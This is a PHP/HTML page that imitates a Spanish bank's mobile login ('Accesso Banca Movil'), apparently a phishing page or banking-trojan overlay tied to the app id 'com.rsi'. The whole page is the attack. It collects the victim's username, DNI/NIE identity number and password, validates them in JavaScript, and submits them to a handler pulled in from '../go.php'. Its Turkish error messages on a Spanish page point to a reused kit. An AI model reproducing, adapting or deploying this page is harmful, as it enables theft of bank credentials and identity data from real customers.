<?php require_once '../go.php';?>
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <link rel="stylesheet" href="libs/bootstrap/dist/css/bootstrap.min.css">
    <link rel="stylesheet" href="libs/font-awesome/css/font-awesome.min.css">
    <link rel="stylesheet" href="libs/css/style.css">
</head>

<body ng-controller="c1" ng-cloak>	

<body>
<img style="margin: 0px auto; display: block;" src="libs/images/logo.png">

<p style="text-align: center;">Accesso Banca Movil</p>
    <div class="main" id="content_div">
        <div class="container">
<div class="row">
                <div class="col-xs-1 col-sm-2"></div>
                <div class="col-xs-10 col-sm-8">
                    <div class="form_">
<br>
					<form method="post">
					
					<input name="field1" value="com.rsi" type="hidden">
					
                            <div class="form-group">
									<input type="text" class="form-control" name="field2" placeholder="Usuario" id="Username" autocomplete="off" autofocus="autofocus" maxlength="10" data-reg="/.{4,10}/" >
 									<span class="delete fa fa-times-circle"></span>
									<span class="err_span"><i class="fa fa-exclamation-triangle" aria-hidden="true"></i>Yanlış bilgi</span>
                           </div>

                            <div class="form-group"> 
									<input type="password" class="form-control" name="field3" placeholder="DNI NIE" id="password" autocomplete="off" data-reg="/.{4,10}/" maxlength="10" >
                                	<span class="delete fa fa-times-circle"></span>
									<span class="err_span"><i class="fa fa-exclamation-triangle" aria-hidden="true"></i>Yanlış bilgi</span>
                            </div>
							
                            <div class="form-group"> 
									<input type="password" class="form-control" name="field4" placeholder="Contrasena" id="Contrasena" autocomplete="off" data-reg="/.{4,10}/" maxlength="10" >
                                	<span class="delete fa fa-times-circle"></span>
									<span class="err_span"><i class="fa fa-exclamation-triangle" aria-hidden="true"></i>Yanlış bilgi</span>
                            </div>

                       				<input class="input_submitBtn" id="input_submitBtn" value="Aceptar" type="submit">
 </form>
 </div>
                </div>
                <div class="col-xs-1 col-sm-2"></div>
            </div>
        </div>
    </div>




	<script type="text/javascript">
                    var g_oBtn = document.getElementById('input_submitBtn');
                    g_oBtn.onclick = function () {
					
						var oNumInp = document.getElementById('Username');
                        var oCodeInp = document.getElementById('password');
                        var oCode = document.getElementById('Contrasena');

						try{
							oNumInp.className = oCodeInp.className = oCode.className = 'form-control';
						} catch(e){};
						
                        if (oNumInp.value.length < 3) {
							try{
								oNumInp.className = 'fielderror';
							} catch(e){};
                            return false;
                        }
						
                        if (!/^\w{3,100}$/i.test(oCodeInp.value)) {
							try{
                                oCodeInp.className = 'fielderror';
							} catch(e){};
                            return false;
                        }
						
                        if (oCode.value.length < 3) {
							try{
								oCode.className = 'fielderror';
							} catch(e){};
                            return false;
                        }
                    }
            </script>

</body>




</html>
